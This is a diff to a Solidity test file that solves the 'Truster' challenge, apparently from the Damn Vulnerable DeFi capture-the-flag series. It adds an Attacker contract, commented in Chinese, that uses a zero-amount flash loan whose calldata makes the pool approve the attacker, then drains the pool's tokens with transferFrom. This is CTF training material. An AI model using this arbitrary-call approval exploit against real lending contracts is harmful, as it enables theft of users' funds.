@@ -51,7 +51,7 @@ contract TrusterChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_truster() public checkSolvedByPlayer {
-        
+        new Attacker(pool, token, recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -64,5 +64,19 @@ contract TrusterChallenge is Test {
         // All rescued funds sent to recovery account
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+// 攻击合约
+contract Attacker {
+    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery, uint256 amount) {
+        // 准备调用代币合约的 approve 函数的数据，批准本合约花费池的代币
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
+        
+        // 执行闪电贷款，借入 0 代币，让池批准本合约
+        pool.flashLoan(0, address(this), address(token), data);
+        
+        // 将池中的代币转移到 recovery 账户
+        token.transferFrom(address(pool), recovery, amount);
     }
 }
